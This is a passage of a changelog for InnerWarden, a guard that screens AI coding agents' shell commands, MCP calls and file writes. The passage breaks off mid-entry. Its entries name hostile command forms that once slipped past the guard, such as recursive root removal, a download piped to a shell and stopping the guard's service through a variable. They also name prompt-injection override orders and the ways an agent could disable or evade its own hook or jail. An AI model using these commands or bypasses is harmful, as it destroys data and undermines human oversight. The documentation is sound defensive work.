# Changelog

All notable changes to InnerWarden are documented here. This project
follows semantic versioning.

## Unreleased

A here-document is read as the input of the command it is written after, and
what a pipe hands a shell on its input is read as that shell's script. A
narrow `Grep` of the home is held for review instead of refused. Every pull
request that touches the guard is now judged line by line against main's
guard, and refused if it lets through a line main stops. The guard still reads
the text of a command; what it does not see is written down, as measured:
[Where this ends](docs/features.md#where-this-ends).

### Added

- **Cursor is screened through its own hooks.** `innerwarden agents connect
  cursor` now writes an entry under `beforeShellExecution`,
  `beforeMCPExecution` and `beforeReadFile` in `~/.cursor/hooks.json`,
  beside the MCP proxy it already wired, so Cursor's shell commands, the
  command lines and paths in its MCP calls and its reads of secrets are judged
  before they run. Every call the guard lets through is answered
  `permission: "allow"`, a refusal is exit 2 with the reason, and a review of a
  shell command or an MCP call asks you. Enforce writes `failClosed: true`,
  monitor does not. `agents disconnect cursor` and `innerwarden uninstall`
  take out only the guard's entries; `agents` and `status` say what is
  screened and what is not (its file edits are not: Cursor has no hook before
  an edit). A shell command that rewrites or removes `~/.cursor/hooks.json` is
  refused. Judged only by the payloads Cursor's hooks documentation gives,
  not on a running Cursor.
- **A Cursor hooks file that lost part of the guard is refused until it is put
  back.** Cursor's file edits are not screened, so an edit can take one
  event's entry out of `~/.cursor/hooks.json` (or turn `failClosed` off). On
  every Cursor call it still sees, the hook reads the file again and, in
  enforce mode, refuses the call with the reason until `innerwarden agents
  connect cursor` restores it (monitor mode only says so). An edit that takes
  every entry out at once is not seen: Cursor then starts no hook of ours.
  `status`, `agents` and the dashboard say it instead: Cursor's hooks are not
  in the file (while its MCP servers still run behind the guard), or its
  hooks run another program than the guard, named with the guard's. The
  dashboard labels what Cursor's hooks judge "Shell commands, MCP calls and
  reads".
- **A large file read by Cursor is judged by its path.** Cursor sends the
  whole file with a `beforeReadFile`; the hook reads that `content` through
  and drops it as it streams, without keeping it or counting it toward the
  1 MiB a call may take, so a read of a 5 MiB file is judged like any other
  (before, every read past 1 MiB was refused as unreadable). A payload that
  is not JSON, one cut short inside the content included, is still refused.
- **Connect keeps your keys in their order.** `agents connect` and
  `disconnect` write `~/.cursor/hooks.json`, `~/.gemini/settings.json` and
  the MCP configs back in the order you wrote them; only the guard's entries
  move. They used to come back sorted.
- The refusal of a hook whose program is gone now names `~/.cursor/hooks.json`
  too. A hook line written by 1.6.15 is still read as the guard's (status,
  repair and uninstall); `agents connect` brings it up to date, and Codex asks
  to trust the new line once.

### Security

- **A project's Cursor hooks are held as its other agent settings are.** An
  agent's write to a project's `.cursor/hooks.json`, by the shell or by a
  file tool, is refused, as a write to a project's `.claude/settings.json`,
  `.claude/settings.local.json`, `.gemini/settings.json` and
  `.codex/config.toml` already was: a project's own settings can switch the
  guard's hook off in that folder.
- **`status` names a project that switches the hook off.** Run in a project
  whose `.claude/settings.json` or `.claude/settings.local.json` sets
  `disableAllHooks`, or whose `.gemini/settings.json` switches hooks off,
  `status` says that the agent started there runs without the guard's hook,
  and that you remove the key. A project file that adds hooks of its own is
  named as hooks the guard does not judge.
- **A review asks you instead of passing unseen.** In enforce mode the hook
  used to refuse a `deny` and let a `review` run without a word (`chmod 777`
  on a folder, for one). It now hands a review to the person: Claude Code
  gets `permissionDecision: "ask"` with the reason, and Hermes Agent
  `action: "approve"`, which its approval gate refuses when nobody is there.
  Codex CLI has no way for a hook to ask, so there a review runs with a
  warning Codex shows you. Gemini CLI, whose ask is not sure to reach a
  person, and any other agent refuse a review with the reason.
  `--block-review` still refuses every review, and monitor mode still never
  refuses. [What the hook does with each verdict](docs/features.md#what-an-agents-hook-does-with-each-verdict).
- **The MCP proxy refuses a read of a named credential store.** In `guard`
  and `kill`, a resource read whose location names a credential
  (`internal://credentials`, `config://auth_tokens`) or a secret store by
  its scheme (`vault://`, `keyring://`, `keychain://`, `kv://`, `env://`,
  `ssm://`, `secrets://`, the cloud stores `aws-sm://`, `azure-keyvault://`,
  `gcp-secret://`, `secret-manager://`, and `x-vault://`) is refused, also
  when the name is written in fullwidth letters. A document, a source file, a
  count or a setting about a credential is not; a file in a folder that names
  one is read with an alert. 1.6.15 alerts on these reads and passes them in
  every mode (measured: `vault://`, `internal://credentials`, `aws-sm://`
  and `x-vault://` reach the server under `--mode guard`). A refusal now
  says which words of the call matched, and an AWS secret access key next to
  its key id is masked in an answer.
- **An order to drop your earlier rules is read by its structure.** A tool
  result that tells the reader to ignore, disregard or forget your previous
  rules, instructions or context and then act is held in `guard` and `kill`,
  whatever the noun or spelling; "ignore all previous versions" is not. Text
  that tells the assistant to adhere to or comply with an instruction is read
  like the other orders to act. On held-out sets, attacks held went from 4 to
  5 of 31, and benign texts held stayed at 0 of 38.
- **A recursive `rm` of the root, a home or a system folder is refused
  without `-f`.** It was refused only when also forced, so `rm -r /` passed.
  Recursion alone is now enough, whatever other letters the flag cluster
  holds.
- **A jail without `--identity` keeps the launcher's records and Claude
  Code's state out of its reach.** On Linux the launcher's records of its
  instances, which the dashboard and the host's agents read, are read-only
  in such a jail (before, a program there could plant one); on macOS the
  sandbox denies writing them. Each refusal `contain` writes for a Linux
  jail is also told beside your own record, as a `guard.blocked` line
  marked `reported_by: jail`: on a host with InnerWarden Community alone a
  refusal in the jail reached no file the host reads. On Linux Claude
  Code's `~/.claude.json` is kept per project instead of lost at every
  launch, cut before each run to Claude Code's own state (MCP servers,
  allowed tools and the trust of a folder are never carried to the next
  run), and each jail has `~/.claude/sessions` and `~/.claude/backups` of
  its own. `~/.claude/settings.json`, which carries the guard's hook, is
  read-only in every jail (on macOS the sandbox denies writing it, and your
  own `~/.claude.json`). A jail does not start on a project whose own
  `.claude/settings*.json` turns every hook off or sets `PreToolUse` hooks
  without the guard's, and says why. A records folder that was already there is
  checked, and what `contain` did not write is moved aside. The guard's
  hook runs a copy of the CLI only root can replace where there is one, so
  InnerWarden Pro's Execution Gate in enforce (Linux) does not refuse it in
  the jail. [AI Jail](docs/features.md).
- **What a pipe hands a shell on its input is its script.** Text that a pipe
  or a here-string hands a shell or an interpreter on its input is read as
  that program's script when the line writes it out (`echo`, `printf`, a
  `cat` here-document, a file written earlier on the line). `cat <<'EOF' |
  sh` with a download piped to a shell inside was allowed; it is now refused,
  and `sh <<< '...'` is read. Text the line does not show (`cat <<EOF | sh`
  holding `$X`) is held for review.
- **An output redirect belongs to the commands it wraps.** A redirect hung on
  a list or a compound command is read as a write by every command inside
  it, so an inner `2>/dev/null` no longer hides an outer `> r.sh` that a
  later `sh r.sh` runs.
- **A here-document belongs to the command it is written after.** In `a &&
  b <<EOF` (and after `;`, `||`, `|`, in a subshell or a function body)
  bash hands the here-document to `b`; the guard gave it to the first command
  of the list. So `cd x && python3 - <<'EOF'` is now read as Python code, and
  a download that code runs is refused for an agent.

### Fixed

- **The MCP proxy raises the verdict of a payment, a message, a share or a
  delete that carries a value a server said.** Each listed tool is classed
  once, from its input schema, its MCP annotations and its name as a hint
  (money-movement, send-external, share, delete, read-secret, fetch-url,
  read-only). A call of a class that acts, carrying a value that appeared in
  anything a server sent this session (results and every block in them,
  embedded resources, resource links, listings, errors, prompts,
  notifications), gets `AG-EFFECT`: a payment to an account, address or link
  a server named is refused, though no rule refuses the tool by name; any
  other such call is forwarded with an alert. Every value counts, at any depth, as a
  map key and joined from pieces. Nothing is lowered: a refusal by name
  (ATR-2026-098, ATR-2026-040) stays, because a value found in no server's
  text is not proof the person asked for it. Lowering waits for the person's
  request as a source. A call judged on its own, outside a proxy session
  (`innerwarden check`, the release suite), is judged as before.
- **A value a server said is found in the spelling a call sends it.** The
  provenance table and the taint tracker compare both sides in one spelling:
  `[at]` and `[.]` put back, percent escapes, HTML entities and base64 runs
  decoded, punycode decoded, NFKC and NFC, letters that pass for ASCII
  letters made ASCII, a scheme or a trailing `/` more or less; accents are
  dropped when only letters and digits are compared. Text that is not ASCII
  is never cut inside a character.
- **An address in quotes in a tool result taints the call that sends to it.**
  `'someone@example.com'` was recorded with its opening quote, so a call to
  `someone@example.com` was not found to carry it; nor was an address with
  a quote on one side only or glued to the next word
  (`'someone@example.com'.The`).
- **A write to a path longer than any path a system opens is read, not
  passed.** The MCP proxy's check of a change to a privileged file gave up on
  a target over 4096 bytes, so `/etc/` padded with `./` up to `sudoers`
  went unread. It now reads the path with `.` and `..` taken out, as a
  server opens it, and refuses one still too long on one line.
- **A refusal names the rule that decided it.** When a rule of the hard layer
  (a revoked agent, a call reaching the guard's LLM key, a change to a
  privileged file) and a general rule both refused an MCP call, the reply
  named the general rule, and a revoked agent's refusal did not say it was
  revoked. The hard rule is now the reason, as it is the one that decides.
- **Bookings and calendar guests are classed.** `reserve_hotel`,
  `book_flight` and the like are class `commitment`, and a calendar entry
  with guests is `send-external` with its guests as destinations; the
  provenance table reads every value they carry.
- **The differential check replays whole MCP sessions.** A corpus line can be
  a session (`surface: session`): client and server messages replayed
  through the proxy's router with one taint tracker, judged by its last
  message. `corpus/mcp-sessions` holds the first ones. A guard without the
  `session` surface cannot judge them, so main against a branch holds for
  them from the pull request after the one that adds them.
- **A restarted MCP proxy still holds a tool the server never listed.** A
  server's pin record carries a mark written by its first listing, even an
  empty one, so the hold no longer depends on the record having pins.
  Whether a `tools/list` answer is the next page or a new listing is decided
  by the client's request (a cursor or not), not by the answer before it.

- **Prose written with `cat` after a `cd` runs.** `cd repo && cat >>
  notes.md <<'EOF'` with words of the guard's rules in the text was refused
  as a line to run, while the same `cat` alone was allowed. It is now read
  as the `cat` alone is.
- **A narrow `Grep` of the home is held for review, not refused.** A Claude
  Code `Grep` of the whole home for an ordinary text (`fn main`, `TODO`) is
  judged as the `grep -r <text> ~` line it equals: held for review. One with
  lines of context, a match across lines, a key or token marker, or a glob
  aimed at `.ssh`, `.aws` or key files keeps the refusal.
- **A credential marker is matched on word boundaries.** Its pattern held two
  raw backspace bytes where it meant word boundaries.

### AI Jail

- **No jail shows your `~/.claude` writable any more.** That folder carries
  the settings that wire the guard's hook, and a program in a jail could
  take the hook out, turn hooks off with a `settings.local.json` of its
  own, or swap a link there for a file. Each project now has a `~/.claude`
  of its own, a folder of the launcher's beside its records: on Linux it is
  bound at `~/.claude`, on macOS Claude Code is pointed at it with
  `CLAUDE_CONFIG_DIR` and the sandbox denies writing yours, your
  `~/.claude.json` and the CLI the guard's hook runs. Your settings are
  read-only copies in it, and a jail does not start where yours or the
  project's may turn the hook off or cannot be read (a link, not JSON, over
  4 MiB, `disableAllHooks` other than `false`, hooks in a form it does
  not read). [Claude Code's state in a jail](docs/features.md).
- **The proxy settings are passed by their exact names.** `innerwarden
  contain` handed in any variable whose name ended in `_PROXY`. It now hands
  in `HTTP_PROXY`, `HTTPS_PROXY`, `FTP_PROXY`, `ALL_PROXY` and `NO_PROXY`,
  in capitals or lowercase, and no other `*_PROXY` name.

### Release checks

- **A corpus of attacks the guard's authors did not write.** The release
  suite now judges the injected text and attack calls of AgentDojo v1.2.2's
  `important_instructions` tasks, the shell lines of small models poisoned
  with a public recipe, and benign controls from the same sources. Its first
  reference records today's misses and false positives as they are: most of
  the injected AgentDojo text is allowed when judged on its own, and most
  false positives are payments and direct messages the user asked for. The
  end to end results through the proxy and the hook are in
  `crates/agent-guard/corpus/external-2026-11/RESULTS.md`.
- **A pull request cannot loosen the guard against main.** On a pull request
  that touches the guard, CI judges every corpus line, plus rewritten
  variants of each malicious shell line, with main's guard and the branch's,
  and fails when main stops a line the branch does not. A line marked
  `must_refuse` can never be waived; a benign line passes only with a dated
  entry saying why it is harmless.

### What this costs

In `guard` and `kill`, an MCP server that keeps ordinary data at a location
named like a credential store has that read refused; reading it is your
call, as reading a credentials file in the shell is.

A line that pipes text it does not write out into a shell is held for
review. A jailed agent that needs a proxy variable under any name other than
the five above needs `--pass-env` with its name.

## 1.6.15 - 2026-11-20

Codex CLI, Gemini CLI and Hermes Agent are screened through their own hooks,
not only on their MCP side: their shell commands and changes to privileged
files are judged before they run. Under an enforcing hook, a line with a part
the guard cannot read is held for review instead of allowed. The MCP proxy
pins each tool's
definition and holds one a server changes, adds or may have renamed until you
approve it. The AI Jail hands in only what a shell needs of your environment.
The guard still reads the text of a command, and what it does not see is
written down: [Where this ends](docs/features.md#where-this-ends).

### Agents

- **Codex CLI, Gemini CLI and Hermes Agent are screened through their own
  hooks.** `innerwarden agents connect codex`, `gemini` or `hermes` now wires
  the guard into the agent's own pre-tool hook: Codex `PreToolUse` in
  `~/.codex/hooks.json`, Gemini `BeforeTool` in `~/.gemini/settings.json`,
  Hermes `hooks.pre_tool_call` in `~/.hermes/config.yaml`. Their shell
  commands and their changes to privileged files (Codex `apply_patch`; Gemini
  `write_file` and `replace`; Hermes `write_file` and `patch`) are judged
  before they run,
  beside the MCP proxy that already carried Codex's and Gemini's MCP servers.
  Gemini's reads (`read_file`, `read_many_files`, `glob`, `grep_search`) and
  Hermes' (`read_file`, `search_files`) are judged by the secret rules Claude
  Code's reads are. A refusal and a call the hook cannot read are recorded.
  Your own hooks keep their place. Codex runs a hook only once it trusts it,
  and connect asks Codex to; Hermes skips a hook nobody approved, and connect
  records the approval in `~/.hermes/shell-hooks-allowlist.json`.
  `innerwarden agents disconnect <agent>` takes it out again.
- **What was measured, on which agent, is said.** Codex: measured on Linux
  with Codex CLI 0.170.0 and on macOS with Codex CLI 0.167.2; needs 0.166.0
  or later (older ones send the session's folder, not the command's). Hermes:
  measured through Hermes Agent v0.23.1's own hook runner (`hermes hooks
  test`), not in a full chat; needs v0.22.5 or later. Gemini CLI: judged only
  by its payload, not on a running Gemini, which needs a Google login; needs
  0.26.0 or later. `agents connect` and `innerwarden status` print the same
  lines.
- **Their enforcing hooks fail closed.** On Linux and macOS an enforcing Codex
  or Gemini hook line runs the guard inside a small `/bin/sh` script, and the
  Hermes entry carries `fail_closed: true` in enforce, so a guard that is
  missing, killed or out of time refuses the call. A monitor line never
  refuses, and on Windows the line is the program alone.
- **Hermes: code and typed text are judged as what they are.** The Python
  `execute_code` runs is judged as `python3 -c`, and text `process_manage`
  types into a running process as a shell line. In enforce, a `terminal`
  command that only starts a shell, a language or a database client, waiting
  for input, is refused. A `terminal` command is judged in the `workdir` it
  names. Not screened: Hermes' other tools (the browser, its MCP servers).
- **Codex: a shell left waiting for input is refused in enforce.** Codex
  types into a running command through `write_stdin`, which runs no hook, so
  in enforce a shell call that starts a shell, a language or a database
  client with nothing to run (`bash`, `python3`, `psql`) is refused. Not
  screened: Codex's `write_stdin` and `tool_search`.
- **An agent cannot switch its own hook off.** Under an enforcing hook, an
  agent that disconnects or lowers its own hook from its shell is refused,
  and so is starting Codex with `--disable hooks` or a `-c` override of its
  hooks, Hermes with `--safe-mode` or `--ignore-user-config`, or any of them,
  Gemini CLI included, with a variable that moves the folder its hook is in
  (`CODEX_HOME`, `HERMES_HOME`, `GEMINI_CLI_HOME`).
- **Writes to the Goose, Hermes and aider settings are refused**
  (`~/.config/goose/config.yaml`, `~/.hermes/config.yaml`,
  `~/.aider.conf.yml`), as writes to the other agent settings are.
- **An AI agent with its own Linux account records in the folder InnerWarden
  Pro gives it.** Where `sudo innerwarden-ctl agent-user add <account>` on the
  Pro install made `/var/lib/innerwarden-agents/<account>/` and an
  `[accounts."<account>"]` entry in `/etc/innerwarden/guard.toml`, the CLI
  running as that account records its decisions there, so Pro reads them
  without the account joining the `innerwarden` group, which reads every
  member's decisions. The account is read from its uid, never from the
  environment, the entry wins over `IW_GRAPH_FILE`, and the folder and its
  parent are checked before any write. Without an entry nothing changes, and
  `innerwarden status` names the command.
- **`innerwarden status` counts only the agent's own decisions.** After
  `innerwarden demo` and no command from the agent, status said its decisions
  proved the agent's commands reach the guard. Demo calls are now counted
  apart and named as demo calls; `agents list` and the dashboard leave them
  out too.

### MCP proxy

- **Each tool's definition is pinned, and a changed one is held until you
  approve it.** The first time a server lists a tool, the proxy keeps the
  SHA-256 of its definition (name, title, description, input and output
  schema, annotations), computed on the proxy's side, in
  `~/.config/innerwarden/mcp-pins.json`. A tool whose definition changes later
  is reported field by field and, in `guard` and `kill`, held: left out of the
  tool list the client sees and refused when called, until you run
  `innerwarden mcp approve <server> <tool>` (or `--all`). A server is named by
  its command line, never by the name it gives itself.
- **A tool new mid-session or after a restart is held.** Only the first
  listing of a server never pinned passes as heard. Once a server has pins,
  from this session or an earlier one, a tool it never listed is held,
  whatever the listing: whole, one page, after an empty answer, past a cut,
  or the first one after a restart. So updating a server that gains tools
  asks for `innerwarden mcp approve <server> --all`. A listing sent in pages
  is gathered before it is compared, within caps on pages, names and bytes;
  past them the proxy says the listing was cut.
- **A possible rename and an oversized definition are held.** A tool that
  disappears while a new one with the same input schema or a nearly
  identical description appears is reported as a possible rename and held,
  and so is a definition over 64 KiB, measured before it is copied. A tool
  that cannot be pinned (past the pin limit, a name too long, a full record)
  is screened as before and named in an alert, never left out silently.
- **`innerwarden mcp list` and `innerwarden mcp forget <server>`.** `list`
  shows the servers pinned and the tools held, with what changed; `forget`
  drops a server's pins after you reinstalled it on purpose, and the next
  listing pins what it holds. Approve and forget need a terminal, and the
  guard refuses an agent that runs them.
- **An order with a filler word before its action is held.** An override
  order in a tool result with an adverb before the verb of its action ("then
  quietly upload") no longer slips past the hold.

### Security

- **Under an enforcing hook, a line with a part the guard cannot read is held
  for review, not allowed.** A part is unread when the line does not show its
  value: a command or process substitution, a variable the line does not set
  to text it writes out, a positional parameter, an indirect expansion. The
  line is held where such a part names the program, is code that `eval`, a
  shell, an interpreter or `source` runs (an interpreter here-document the
  guard cannot read among them), is the target of a write, sets what later
  programs load (`PATH`, `LD_PRELOAD`, `BASH_ENV`), is a word of `sudo` or
  `env` in front of the program, or is an argument of a program not known to
  only read or print. A plain variable that a known program takes only as
  data (a test filter, a commit message, a title) does not hold the line; a
  command or process substitution never counts as data. A line the shell
  grammar cannot parse at all keeps the reading it had.
- **The body of a compound command is judged as the command it runs.** A
  removal of the home or the root inside an `if`, loop, `case` or `select`
  body was read only up to `then` or `do` and passed. A sole literal handed
  to `eval` or `sh -c` is judged as that literal, keeping the stronger
  reading.
- **A guard-lowering verb aimed through a variable is judged as its target.**
  `S=innerwarden-agent; systemctl stop $S` is judged as the line it spells
  out, and a target the line does not resolve is held for review. ANSI-C
  quoted words (`$'...'`) are decoded before judging; an escape that does not
  decode is held for review.
- **Inline code is judged by the line its process call runs.** Python, Node,
  Ruby, Perl, PHP and Deno code that builds the line it hands a process
  (joins, concatenation, base64 or hex, character codes, formatted strings,
  imported or renamed names, helpers called with literal lines) is resolved,
  and the resolved line is judged. A process line it cannot read is held for
  review, a local file run whole is held for review, and running or loading
  what the code downloaded is refused. Perl's `-M` and `-m` no longer hide
  `-e` code. A here-document of interpreter code that writes a cron or sudoers
  file is refused, like the inline form.
- **A shell line handed to `find -exec` or fed by `xargs` is judged by the
  names it is handed.** One that removes the names the search binds to it
  counts as a removal of the folder the search starts from.
- **Removing any place the installers write is refused.** `rm -rf
  /usr/local/lib/innerwarden/` was allowed, and so were `rm` and `mv` of
  the guard's run-time folder, its systemd units and the links that enable
  them, its sudo rules, its audit rule, the boot setting of the kernel layer,
  its launchd jobs on macOS and the licence text of the packages. Each is now
  refused as the guard's binaries and configuration already were.
- **A `pkill -f` is judged by what its pattern matches.** The pattern is
  matched against the command lines the guard's own processes run with: one
  that spells the guard's name another way (`[i]nnerwarden-agent`) is now
  refused, and one that matches none of them (`pkill -f
  innerwarden-agent-guard`, a test run of the crate) is no longer refused for
  the words it holds.
- **A `bpftool` detach of the guard's programs is refused.** `bpftool net
  detach` or `cgroup detach` naming the guard's pinned path or name is
  refused; one that names neither is held for review, as the text cannot
  tell whose program it takes off.

### AI Jail

- **The AI Jail lets in only what a shell needs of your environment.**
  `innerwarden contain` took out the variables whose name looked like a
  credential, so a secret under any other name (a `DATABASE_URL` holding a
  password, `STRIPE_SK`) reached the jailed command. It now hands in only
  `PATH`, `HOME`, `USER`, `LOGNAME`, `SHELL`, `LANG`, `LC_*`, `TERM`,
  `TZ`, `TMPDIR`, `COLORTERM` and the proxy settings (`*_PROXY`,
  `NO_PROXY`), on Linux with or without `--identity` and on macOS, and names
  every variable it kept out (never a value). The cost: an agent that read
  any other variable from the environment (its API key, `CLAUDE_CONFIG_DIR`,
  `EDITOR`, a loader variable) now needs `--pass-env NAME` for each.
- **A jail the kernel will not start says why, and nothing runs unjailed.**
  A Linux host whose kernel refuses an unprivileged user namespace
  (`kernel.unprivileged_userns_clone = 0`, `user.max_user_namespaces = 0`, a
  container's policy) gets the reason and the setting that resolves it, and
  the dashboard no longer says the jail is ready there. Under InnerWarden
  Pro's Execution Gate, a jail whose launcher dies before the gate answers
  starts nothing, and the gate's refusal is reported; before, nothing ran and
  nothing said why.

### Hook

- **A tool result past 1 MiB is recorded, not refused.** A PostToolUse call
  longer than the 1 MiB the hook reads (a `Read` or `Edit` of a large file)
  has already run: it is now recorded from its first 1 MiB, with the tool
  name and path read from its top-level fields, instead of being refused with
  a blocking error. A PreToolUse call past the cap is still refused in
  enforce.
- **OpenClaw says when a call was cut.** An OpenClaw tool call past 1 MiB was
  cut there without a word. It is now never judged on the part that was
  read: it is refused in enforce, and said to have gone unscreened in
  monitor.

### Fixed

- **Text that interpreter code only edits, writes or prints is not a
  command.** `python3 - <<'EOF'` that edits a file with `s.replace(old,
  new)`, where the strings hold `rm -rf -- "$dir"/x`, was refused as a
  removal. In Python, Node and Ruby code, only the line a process call runs
  now counts; a string that reaches a process, runs code where it stands (an
  f-string, a Ruby backquote, a tagged template) or passes through anything
  the reader cannot follow keeps its refusal, and the guard's own words and
  startup files are still read in the whole line. A string that names a place
  outside the tree (a startup, cron, sudoers or systemd file) is still read.
- **Inline code that runs a literal harmless line is no longer refused for
  naming the call** (`os.system('clear')`, `shell_exec('ls')`).
- **A quoted folder-query tool after an install or a `cd` runs.**
  `"$(npm bin)/jest"` was refused when the only thing before it on the line
  was a package-manager install or a `cd` into a project folder. Anything
  that writes, copies, links or changes the path first keeps the refusal, and
  the refusal now names the way out that works.
- **`innerwarden check '<line>'` is judged as the check it is,** not as the
  line it inspects, when nothing else runs on the line. The `eval` completion
  idiom is accepted only for a bare substitution of the tool and its words.
- **A folder that only shares the guard's name is no longer taken for the
  guard's program,** and `curl`'s insecure check no longer reads across a
  line break.
- **The CLI says what it can see.** `agents list` no longer calls the
  Execution Gate off when it cannot be seen from a shell; the restart notice
  says why a restart is needed and how, for each connected agent;
  `innerwarden status` names InnerWarden Community instead of "this edition";
  and on macOS the agent process scan lists processes instead of always
  answering that it does not know.
- **A long line is parsed once.** A 64 KiB `python3 -c` line was parsed by
  the shell grammar 19 times in one check, 5 to 8 ms each in a release
  build; it is now parsed once.
- **Dependencies:** regex-automata 0.4.18, fancy-regex 0.20.2, xattr 1.7.0,
  tokio 1.54.1, ureq 3.5.2.

### What this costs

Some ordinary lines are held under an enforcing hook, and the hold says why.
A line whose program, write target or arguments come from a substitution or
from a variable the line does not set is held for review unless the program
only reads or prints, or takes the value only as data. A Codex shell call or
a Hermes `terminal` command that only opens a shell, a language or a database
client is refused in enforce. An agent
in the AI Jail that reads any variable outside the short list above needs
`--pass-env` with its name. Behind the MCP proxy in `guard` or `kill`, a
server updated to one with more tools, or one that changes a tool's
definition, has those tools held until you run `innerwarden mcp approve`. An
enforcing Codex, Gemini or Hermes hook refuses every call once the
innerwarden program is gone: run `innerwarden uninstall` before removing the
package, or take the hook out of the agent's settings by hand.

### Upgrading

`innerwarden upgrade` rewires the Claude Code hooks with the new binary, as
it does since 1.6.14. It does not add the new Codex, Gemini or Hermes hooks:
a Codex or Gemini CLI connected by an earlier version keeps only its MCP side
until you run `innerwarden agents connect codex` or `gemini` again, and
Hermes Agent is connected with `innerwarden agents connect hermes`. Pins
start empty, so the first listing of each MCP server after the upgrade is
pinned as heard and asks for no approval.

The guard reads text, and its limits are listed in `docs/features.md`, under
[The guard and its own switches](docs/features.md#the-guard-and-its-own-switches).
The boundary there is the host: on Linux, InnerWarden Pro's Execution Gate,
armed for an agent, decides in the kernel which programs that agent's
processes may start, whatever the command line says. It is off until you arm
it.

## 1.6.14 - 2026-11-19

The guard reads more of what a line hands a shell, and more of the files an
agent could write itself a way back in through. A command inside `sh -c` is
judged by every rule, as if typed; every shell write of the login, sudo,
account, scheduled-job and stored-credential files is refused; and the MCP
proxy reads what a tool call hands a shell on its input. An enforcing Claude
Code hook now refuses when its program is gone, and `innerwarden demo` sends
known risky calls through each connected agent's own guard path and shows what
was refused. The guard still reads the text of a command, and what it does not
see is written down: [Where this ends](docs/features.md#where-this-ends).

### Security

- **A command handed to a shell is judged by every rule.** A destructive
  command inside `sh -c`, `bash -c` or another shell was judged only by the
  download rules; it now gets the verdict the same command typed directly
  gets. The value a `-c` variable may hold is read in the order the shell runs
  it, every value it may hold is judged, and one set at run time (by `read`,
  `printf -v` or `mapfile`, under `||`, in a subshell, a function, a `trap`
  or a loop) is held for review. Aliases are read as written and as resolved,
  so `alias rm=true; rm -rf /` stays refused; a function call runs its body
  with the call's arguments; `command` and `builtin` forms, `coproc` groups,
  namerefs (a write through `declare -n` is a write to its target), `wait -p`
  and `getopts` names are read as bash reads them; and the code option of
  programs that take code (`gdb`, `osascript`, `psql`, `pwsh` and their kin)
  is read as code.
- **Every shell write of the login, sudo, account, scheduled-job and
  stored-credential files is refused.** `authorized_keys`, the sudo rules, the
  account files, crontabs and stored cloud or registry credentials are refused
  in every shell form (a redirection, `tee`, `sed -i`, `cp`, `mv`, `ln`,
  `install`, `dd`, `truncate`, through a variable or a link the line made), as
  the direct form already was, and so is inline interpreter code that writes
  `authorized_keys` or the sudo rules. Every shell write of the SSH client
  configuration is refused. Reading these files is unchanged, and files that
  only share the name elsewhere are not matched.
- **A startup file replaced from content the guard cannot see is held for
  review.** Replacing or appending to a shell startup file, or creating a user
  service or login item, from a copy, a link, a fetched variable or a
  here-document with a substitution in it is held for review; content the
  line shows is judged as before. A copy from the account or cron files is
  read as a read of them.
- **Inline interpreter code that wipes a home or writes an agent's settings
  is refused.** Python, Node, Ruby, Perl, PHP or Lua code, in a here-document
  or with `-c`, that writes, truncates, removes, moves or links an agent's
  settings is refused, and so is inline code that removes a whole home or the
  root. A scoped cleanup under the home stays allowed.
- **A write through a link the line made reaches its target.** A write or a
  removal through a symbolic link, a hard link or a `cp -s` or `cp -l` copy
  the same line made is judged against what it leads to.
- **Fetched payloads are read in more of the forms that run them.** A download
  run through arithmetic or a subscript, a brace-expanded command word,
  `time`, `stdbuf` or `nice` with glued values, `go run`, `go generate` or
  `go test` of fetched source, or used as a program name gets the verdict of
  its direct form. A download fed to a local shell script (a pipe, a process
  substitution or a here-string) is held for review.
- **A key is followed through the names a line builds for it.** A private key
  name built from the public key's name (parameter operators, `basename`,
  `dirname`, `sed`, `cut`, or a substitution that cannot be worked out on a
  variable under `~/.ssh`) is read as the private key. A recursive search of
  the home or a broad root for the start of a credential (cloud and token
  prefixes, private key headers), also through `find -exec grep` and `rg`, is
  refused. `.npmrc`, `.pypirc` and Docker and cloud CLI settings are judged
  by the project, as `.env` is.
- **The container runtime is refused however it is reached.** The rule on a
  container that hands an agent the host now covers the per-user runtime
  sockets (rootless Docker, Podman, colima, Lima, OrbStack, Rancher Desktop)
  and the other clients that reach one (`curl --unix-socket`, `socat`,
  `nc -U`, `DOCKER_HOST`, `docker -H`, `podman --url`, `ctr`, `nerdctl`,
  `crictl`). Ordinary container work (`docker ps`, `run`, `build`,
  `compose`) is unchanged.
- **A removal is judged by the root a search hands it.** `find` with `-exec`,
  `-execdir` or `-ok` handing what it finds to `rm`, `shred`, `unlink`,
  `truncate`, `dd` or to a shell whose `-c` line removes it is judged as a
  removal of the folder `find` starts from: the home, `~/.ssh`, the root,
  system folders and the guard's places are refused, a project cleanup is
  not. `xargs` feeding a recursive removal from a listing of a protected
  place is refused, and from input the guard cannot read is held for review.
  `/Users` is a system folder, as `/home` is.
- **Killing every process, or init, is refused,** and so is `systemctl` with a
  power target or `-H`.
- **A rewrite of InnerWarden Pro's kernel maps is refused.** A `bpftool` write
  to the guard's maps named by path or by name is refused; one named by a
  numeric id is held for review.
- **The MCP proxy reads what a tool call hands a shell.** A command handed to a
  shell on its input and a `bash -c` line inside a call's arguments are judged
  as command lines. Input to a shell past 64 KiB is judged within that cap and
  the call is held for review. Orders aimed at the model inside a tool result
  are flagged, and an override order followed by an action is held however it
  is quoted or fenced. A tool result cut at the cap raises a partial-read
  alert.
- **An enforcing Claude Code hook refuses when its program cannot run.** On
  macOS and Linux, a hook in enforce or `--block-review` ends in a short shell
  tail, so a hook whose program is gone or dies refuses the call instead of
  letting it through. Monitor never refuses, and Windows gets no tail.
- **The hook reads at most 1 MiB of a tool call,** the same cap as OpenClaw's
  path. A longer call is not read and never let through quietly: it is
  refused in enforce, and said to have gone unscreened in monitor.
- **The AI Jail keeps exported credentials out of the jailed command's
  environment.** `innerwarden contain` takes out the variables whose name
  says they hold a credential (`OPENAI_API_KEY`, `AWS_SECRET_ACCESS_KEY`,
  `GITHUB_TOKEN` and other names ending in `_API_KEY`, `_TOKEN`, `_SECRET`,
  `_PASSWORD` and the like), on Linux with or without `--identity` and on
  macOS, and names the ones it took out. `--pass-env NAME` hands one in, for
  an agent that needs its own key. It goes by the name: a secret under any
  other name (a `DATABASE_URL` that holds a password) still reaches the jail.

### Added

- **`innerwarden demo`.** Sends a few known risky calls (a download piped to a
  shell, a read of an SSH key, a write of agent settings, a home wipe inside
  `bash -c`, an MCP call) through the guard path each connected agent really
  uses, and shows what was refused. Nothing is run. Each demo call is recorded
  and marked as a demo; only its alert and second opinion are skipped.
- **`innerwarden upgrade` rewires the hooks with the new binary,** keeping the
  mode of every hook half, and the first hook run of a new version rewires
  once, so an upgrade brings the wiring of the version it installs. A rewire
